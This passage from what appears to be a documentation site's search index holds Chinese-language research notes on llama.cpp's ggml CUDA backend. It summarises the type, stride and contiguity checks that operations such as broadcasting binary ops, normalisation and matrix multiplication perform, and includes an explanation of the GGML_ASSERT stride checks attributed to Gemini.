\u7684\u7c7b\u578b\u76f8\u540c\u3001\u5360\u7528\u5b57\u8282\u6570\u76f8\u540c\u5e76\u4e14\u90fd\u8fde\u7eed\uff1a\u76f4\u63a5\u8c03\u7528 <code>cudaMemcpyAsync</code> \u590d\u5236\u3002</li> <li>\u7c7b\u578b\u4e0d\u540c\u6216\u8005\u4e0d\u8fde\u7eed\uff1a\u5bf9\u652f\u6301\u7684\u7c7b\u578b\u8fdb\u884c\u6392\u5217\u7ec4\u5408<ul> <li>\u975e\u91cf\u5316\u7c7b\u578b\uff08F32\u3001F16\uff09\uff1a\u65e0\u989d\u5916\u68c0\u67e5</li> <li>\u91cf\u5316\u7c7b\u578b\uff08Q4_0\u3001Q8_0...\uff09\uff1a<code>src1</code> \u662f\u91cf\u5316\u7c7b\u578b\u65f6\uff0c\u4f1a\u68c0\u67e5 <code>src0</code> \u7684\u5143\u7d20\u4e2a\u6570\u662f\u5426\u80fd\u548c\u91cf\u5316\u7c7b\u578b\u5bf9\u5e94\u7684\u5757\u5927\u5c0f\u5bf9\u9f50</li> </ul> </li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_bin_bcast","title":"ggml_cuda_op_bin_bcast","text":"<p>\u6267\u884c\u4e8c\u5143\u64cd\u4f5c\u7684\u5e7f\u64ad\uff0c\u6a21\u677f\u51fd\u6570\u3002</p> <ul> <li>\u9650\u5b9a <code>src1</code> \u7c7b\u578b\u4e3a F32 \u6216 F16</li> <li>\u5bf9 <code>src0</code> \u3001<code>src1</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u8fdb\u884c\u6392\u5217\u7ec4\u5408\uff0c\u518d\u8fdb\u5165 <code>bin_bcast_cuda.operator()</code> \u8fdb\u884c\u8ba1\u7b97</li> </ul> <p><code>bin_bcast_cuda.operator()</code> \u8fdb\u884c\u5e7f\u64ad\u64cd\u4f5c\uff0c\u76f8\u5173\u903b\u8f91\u8fd8\u5728\u770b\u3002</p> \u95ee\u4e86 Gemini <p>\u5728\u60a8\u63d0\u4f9b\u7684 <code>bin_bcast_cuda</code> \u4ee3\u7801\u4e2d\uff0c<code>GGML_ASSERT</code> \u8bed\u53e5\u4e3b\u8981\u7528\u4e8e\u6267\u884c\u4ee5\u4e0b\u6570\u636e\u8303\u56f4\u548c\u5b8c\u6574\u6027\u68c0\u67e5\uff1a</p> <ol> <li> <ul> <li><code>GGML_ASSERT(nb0 % sizeof(dst_t) == 0);</code></li> <li><code>GGML_ASSERT(nb1 % sizeof(dst_t) == 0);</code></li> <li><code>GGML_ASSERT(nb2 % sizeof(dst_t) == 0);</code></li> <li><code>GGML_ASSERT(nb3 % sizeof(dst_t) == 0);</code></li> <li>\u4ee5\u53ca\u9488\u5bf9 <code>src0</code> \u548c <code>src1</code> \u7684\u7c7b\u4f3c\u68c0\u67e5\uff08<code>nb00</code> \u5230 <code>nb03</code>\uff0c<code>nb10</code> \u5230 <code>nb13</code>\uff09\u3002</li> </ul> <p>\u6b65\u957f\uff08Stride\uff09\u4e0e\u5bf9\u9f50\u68c0\u67e5\uff1a</p> <p>\u8fd9\u4e9b\u65ad\u8a00\u68c0\u67e5\u786e\u4fdd\u4e86\u6bcf\u4e2a\u7ef4\u5ea6\uff08\u4ece <code>nb0</code> \u5230 <code>nb3</code> \u4ee3\u8868\u76ee\u6807\u5f20\u91cf <code>dst</code> \u7684\u6b65\u957f\uff0c<code>nb00</code> \u5230 <code>nb03</code> \u4ee3\u8868 <code>src0</code> \u7684\u6b65\u957f\uff0c<code>nb10</code> \u5230 <code>nb13</code> \u4ee3\u8868 <code>src1</code> \u7684\u6b65\u957f\uff09\u7684\u5b57\u8282\u6b65\u957f\u662f\u5bf9\u5e94\u6570\u636e\u7c7b\u578b\u5927\u5c0f\uff08\u4f8b\u5982 <code>sizeof(float)</code> \u6216 <code>sizeof(__half)</code>\uff09\u7684\u7cbe\u786e\u500d\u6570\u3002\u5728 GGML \u4e2d\uff0c\u5f20\u91cf\u6570\u636e\u4ee5\u884c\u4e3b\u5e8f\u5b58\u50a8\uff0c\u5e76\u4e14 <code>ggml_tensor</code> \u7ed3\u6784\u5305\u542b\u6bcf\u4e2a\u7ef4\u5ea6\u7684\u5143\u7d20\u6570\u91cf (<code>ne</code>) \u548c\u5b57\u8282\u6b65\u957f (<code>nb</code>) [1, 2, 3, 4, 5, 6]\u3002\u8fd9\u79cd\u8bbe\u8ba1\u5141\u8bb8\u5b58\u50a8\u975e\u8fde\u7eed\u5185\u5b58\u4e2d\u7684\u5f20\u91cf\uff0c\u8fd9\u5bf9\u4e8e\u8f6c\u7f6e\u548c\u7f6e\u6362\u7b49\u64cd\u4f5c\u975e\u5e38\u6709\u7528 [1, 2, 3, 4, 5]\u3002\u5982\u679c\u6b65\u957f\u4e0d\u662f\u6570\u636e\u7c7b\u578b\u5927\u5c0f\u7684\u7cbe\u786e\u500d\u6570\uff0c\u90a3\u4e48\u5728\u5185\u5b58\u4e2d\u904d\u5386\u5f20\u91cf\u65f6\u8fdb\u884c\u6307\u9488\u7b97\u672f\u5c06\u5bfc\u81f4\u5185\u5b58\u8bbf\u95ee\u9519\u4f4d\u6216\u6570\u636e\u89e3\u91ca\u9519\u8bef\uff0c\u53ef\u80fd\u5f15\u53d1\u7a0b\u5e8f\u5d29\u6e83\u6216\u9759\u9ed8\u7684\u6570\u636e\u635f\u574f\u3002\u56e0\u6b64\uff0c\u8fd9\u4e9b\u68c0\u67e5\u5bf9\u4e8e\u786e\u4fdd\u6b63\u786e\u7684\u5185\u5b58\u8bbf\u95ee\u548c\u6570\u636e\u5b8c\u6574\u6027\u81f3\u5173\u91cd\u8981\u3002</p> </li> <li> <p>\u6700\u5185\u5c42\u6b65\u957f\u68c0\u67e5\uff08\u5143\u7d20\u8fde\u7eed\u6027\uff09\uff1a</p> <ul> <li><code>GGML_ASSERT(s0 == 1);</code></li> <li><code>GGML_ASSERT(s00 == 1);</code></li> <li><code>GGML_ASSERT(s10 == 1);</code></li> </ul> <p>\u8fd9\u4e9b\u65ad\u8a00\u68c0\u67e5\u786e\u4fdd\u4e86\u76ee\u6807\u5f20\u91cf (<code>dst</code>)\u3001\u7b2c\u4e00\u4e2a\u6e90\u5f20\u91cf (<code>src0</code>) \u548c\u7b2c\u4e8c\u4e2a\u6e90\u5f20\u91cf (<code>src1</code>) \u7684\u6700\u5185\u5c42\u7ef4\u5ea6\uff08\u7ef4\u5ea6 0\uff09\u7684\u5143\u7d20\u6b65\u957f (<code>s0</code>, <code>s00</code>, <code>s10</code>) \u4e3a 1\u3002\u8fd9\u610f\u5473\u7740\u6700\u5185\u5c42\u7ef4\u5ea6\u7684\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u662f\u4e25\u683c\u8fde\u7eed\u7684\u3002\u8fd9\u79cd\u8fde\u7eed\u6027\u5bf9\u4e8e GPU \u4e0a\u9ad8\u6548\u7684\u9010\u5143\u7d20\u64cd\u4f5c\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u5728 CUDA \u5185\u6838\u7684\u6700\u5185\u5c42\u5faa\u73af\u4e2d\u8fdb\u884c\u7b80\u5355\u7684\u7ebf\u6027\u8bbf\u95ee\uff0c\u4ece\u800c\u4fc3\u8fdb\u5185\u5b58\u5408\u5e76\uff08memory coalescing\uff09\u548c\u5411\u91cf\u5316\u3002\u975e\u5355\u4f4d\u6b65\u957f\u5c06\u9700\u8981\u66f4\u590d\u6742\u7684\u7d22\u5f15\u8ba1\u7b97\uff0c\u5e76\u53ef\u80fd\u5bfc\u81f4\u6027\u80fd\u4e0b\u964d\u3002</p> </li> </ol> <p>\u5c5e\u4e8e <code>ggml_cuda_op_bin_bcast</code> \u7684\u64cd\u4f5c\u6709\uff1a</p> <ul> <li><code>ggml_cuda_op_repeat</code>\uff1a\u628a <code>src0</code> \u7684\u6570\u636e\u8fdb\u884c\u91cd\u590d\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</li> <li><code>ggml_cuda_op_add</code>\uff1atensor \u5143\u7d20\u76f8\u52a0</li> <li><code>ggml_cuda_op_sub</code>\uff1atensor \u5143\u7d20\u76f8\u51cf</li> <li><code>ggml_cuda_op_mul</code>\uff1atensor \u5143\u7d20\u76f8\u4e58</li> <li><code>ggml_cuda_op_div</code>\uff1atensor \u5143\u7d20\u76f8\u9664</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_acc","title":"ggml_cuda_op_acc","text":"<p>\u5c06 <code>src0</code> \u548c <code>src1</code> \u7684\u6570\u636e\u76f8\u52a0\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u90fd\u4e3a F32</li> <li>\u68c0\u67e5 <code>dst</code> \u662f\u5426\u4e3a 3D \u5f20\u91cf</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_unary","title":"ggml_cuda_op_unary","text":"<p>\u6267\u884c\u4e00\u5143\u64cd\u4f5c\uff0c\u6a21\u677f\u51fd\u6570\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u662f\u5426\u8fde\u7eed</li> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32 \u6216 F16\uff0c\u5e76\u4e14 <code>dst</code> \u7684\u7c7b\u578b\u5fc5\u987b\u548c <code>src0</code> \u76f8\u540c</li> </ul> <p>\u5bf9\u4e8e\u4e0d\u540c\u79cd\u7c7b\u7684\u4e00\u5143\u64cd\u4f5c\u5e76\u6ca1\u6709\u989d\u5916\u68c0\u67e5\u3002</p>"},{"location":"research/llama_5.28/#ggml_cuda_op_norm","title":"ggml_cuda_op_norm","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c\u5f52\u4e00\u5316\u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u4ece <code>dst.op_params</code> \u4e2d\u83b7\u53d6 <code>eps</code> \u53c2\u6570\uff0c\u68c0\u67e5\u662f\u5426\u4e3a\u6b63\u6570</li> <li><code>src0</code> \u5f20\u91cf\u7684\u6700\u5185\u5c42\u7ef4\u5ea6\uff08\u7ef4\u5ea6 0\uff09\u7684\u5b57\u8282\u6b65\u957f\u5fc5\u987b\u7b49\u4e8e\u5176\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\uff0c\u5373\u6700\u5185\u5c42\u7ef4\u5ea6\u7684\u5143\u7d20\u5fc5\u987b\u8fde\u7eed</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_group_norm","title":"ggml_cuda_op_group_norm","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c\u7ec4\u5f52\u4e00\u5316\u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u68c0\u67e5 eps \u53c2\u6570\u662f\u5426\u4e3a\u6b63\u6570</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_l2_norm","title":"ggml_cuda_op_l2_norm","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c L2 \u5f52\u4e00\u5316\u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <p>\u68c0\u67e5\u4e0e <code>ggml_cuda_op_norm</code> \u76f8\u540c\u3002</p>"},{"location":"research/llama_5.28/#ggml_cuda_op_concat","title":"ggml_cuda_op_concat","text":"<p>\u5c06\u4e24\u4e2a 32 \u4f4d\u6d6e\u70b9\u578b\u5f20\u91cf <code>src0</code> \u548c <code>src1</code> \u6cbf\u7740\u6307\u5b9a\u7684\u7ef4\u5ea6\u8fdb\u884c\u62fc\u63a5\uff0c\u7ed3\u679c\u5b58\u50a8\u5728 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code>\u3001 <code>src1</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u4e4b\u540e\u6839\u636e <code>src0</code> \u548c <code>src1</code> \u7684\u8fde\u7eed\u6027\u91c7\u7528\u4e0d\u540c\u7684\u8ba1\u7b97\u65b9\u5f0f</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_upscale","title":"ggml_cuda_op_upscale","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c\u4e0a\u91c7\u6837\u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_pad","title":"ggml_cuda_op_pad","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c\u586b\u5145\u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u9650\u5b9a <code>src0</code> \u548c <code>dst</code> \u4e3a 3D \u5f20\u91cf</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_arange","title":"ggml_cuda_op_arange","text":"<p>\u751f\u6210\u4e00\u4e2a\u4e00\u7ef4\u5f20\u91cf <code>dst</code>\uff0c\u5176\u5143\u7d20\u4e3a\u7b49\u5dee\u6570\u5217\u3002</p> <ul> <li>\u68c0\u67e5 <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u4ece <code>dst.op_params</code> \u4e2d\u83b7\u53d6 <code>start</code>\u3001<code>stop</code> \u548c <code>step</code> \u53c2\u6570\uff0c\u68c0\u67e5\u751f\u6210\u7684\u5143\u7d20\u4e2a\u6570\u662f\u5426\u548c <code>dst</code> \u7684\u5143\u7d20\u4e2a\u6570\u76f8\u540c</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_timestep_embedding","title":"ggml_cuda_op_timestep_embedding","text":"<p>\u4e3a <code>src0</code> \u751f\u6210\u65f6\u95f4\u6b65\u5d4c\u5165\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_leaky_relu","title":"ggml_cuda_op_leaky_relu","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c Leaky ReLU \u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u662f\u5426\u8fde\u7eed</li> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32 \u6216 F16\uff0c\u5e76\u4e14 <code>dst</code> \u7684\u7c7b\u578b\u5fc5\u987b\u548c <code>src0</code> \u76f8\u540c</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_silu_back","title":"ggml_cuda_op_silu_back","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c SiLU \u64cd\u4f5c\u7684\u53cd\u5411\u4f20\u64ad\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <p>\u68c0\u6d4b\u4e0e <code>ggml_cuda_op_leaky_relu</code> \u76f8\u540c\u3002</p>"},{"location":"research/llama_5.28/#ggml_cuda_op_rms_norm","title":"ggml_cuda_op_rms_norm","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c RMS \u5f52\u4e00\u5316\u64cd\u4f5c\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <p>\u68c0\u67e5\u4e0e <code>ggml_cuda_op_norm</code> \u76f8\u540c\u3002</p>"},{"location":"research/llama_5.28/#ggml_cuda_op_rms_norm_back","title":"ggml_cuda_op_rms_norm_back","text":"<p>\u5bf9 <code>src0</code> \u8fdb\u884c RMS \u5f52\u4e00\u5316\u64cd\u4f5c\u7684\u53cd\u5411\u4f20\u64ad\uff0c\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u68c0\u67e5 eps \u53c2\u6570\u662f\u5426\u4e3a\u6b63\u6570</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_mul_mat","title":"ggml_cuda_mul_mat","text":"<p>\u77e9\u9635\u4e58\u6cd5\u3002</p> <p>\u6839\u636e\u4e0d\u540c\u8f93\u5165\u9009\u62e9\u4e0d\u540c\u7684\u8ba1\u7b97\u65b9\u5f0f\uff1a</p> <ul> <li><code>use_mul_mat_vec</code>\uff1a<code>src0</code> \u7c7b\u578b\u4e3a\u975e\u91cf\u5316\u7c7b\u578b\uff08F32\u3001F16\u3001BF16\uff09\uff0c\u4e14 <code>src1</code> \u4e3a F32 \u5411\u91cf\u3002</li> <li><code>use_mul_mat_vec_q</code>\uff1a<code>src0</code> \u4e3a\u91cf\u5316\u7c7b\u578b\uff0c\u4e14 <code>src1</code> \u4e3a\u7b2c\u4e8c\u7ef4\u5927\u5c0f\u4e0d\u8d85\u8fc7 <code>MMVQ_MAX_BATCH_SIZE</code> \u7684 F32 \u5f20\u91cf\u3002</li> <li><code>use_mul_mat_q</code>\uff1a<code>src0</code> \u4e3a\u91cf\u5316\u7c7b\u578b\uff0c\u4e14 <code>src1</code> \u4e3a F32 \u5f20\u91cf\u3002</li> <li>\u5176\u4ed6\u60c5\u51b5\u4f7f\u7528\u901a\u7528\u7684\u77e9\u9635\u4e58\u6cd5 <code>ggml_cuda_op_mul_mat</code></li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_mul_mat_vec","title":"ggml_cuda_mul_mat_vec","text":"<p>\u77e9\u9635\u548c\u5411\u91cf\u76f8\u4e58\u3002</p> <ul> <li>\u68c0\u67e5 <code>src1</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u68c0\u67e5 <code>src1</code> \u7b2c\u56db\u7ef4\u5ea6\u548c <code>dst</code> \u7684\u7b2c\u56db\u7ef4\u5ea6\u662f\u5426\u76f8\u7b49</li> <li>\u68c0\u67e5 <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u6700\u5185\u5c42\u7ef4\u5ea6\u5143\u7d20\u662f\u5426\u8fde\u7eed</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_mul_mat_vec_q","title":"ggml_cuda_mul_mat_vec_q","text":"<p>\u91cf\u5316\u77e9\u9635\u548c\u5411\u91cf\u76f8\u4e58\u3002</p> <p>\u68c0\u67e5\u548c <code>ggml_cuda_mul_mat_vec</code> \u7c7b\u4f3c\u3002</p>"},{"location":"research/llama_5.28/#ggml_cuda_mul_mat_batched_cublas","title":"ggml_cuda_mul_mat_batched_cublas","text":"<p>\u4f7f\u7528 cuBLAS \u8fdb\u884c\u6279\u91cf\u77e9\u9635\u4e58\u6cd5\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>src1</code> \u662f\u5426\u4e3a\u975e\u8f6c\u7f6e\u5e03\u5c40\uff08<code>nb0 &gt; nb1</code>\uff09</li> <li>\u68c0\u67e5 <code>src0</code> \u7684\u540e\u7aef\u662f\u5426\u4e3a CUDA \u4e14\u7c7b\u578b\u4e3a F16</li> <li>\u68c0\u67e5 <code>src1</code> \u7684\u7b2c\u4e09\u7ef4\u662f\u5426\u4e3a <code>src0</code> \u7b2c\u4e09\u7ef4\u7684\u6574\u6570\u500d</li> <li>\u68c0\u67e5 <code>src1</code> \u7684\u7b2c\u56db\u7ef4\u662f\u5426\u4e3a <code>src0</code> \u7b2c\u56db\u7ef4\u7684\u6574\u6570\u500d\uff08\u8fd9\u4e24\u4e2a\u68c0\u67e5\u5e94\u8be5\u662f\u4e3a\u4e86\u4fdd\u8bc1\u5e7f\u64ad\u64cd\u4f5c\u7684\u6b63\u786e\u6027\uff09</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_mul_mat","title":"ggml_cuda_op_mul_mat","text":"<p>\u901a\u7528\u77e9\u9635\u4e58\u6cd5\u3002</p>"}]}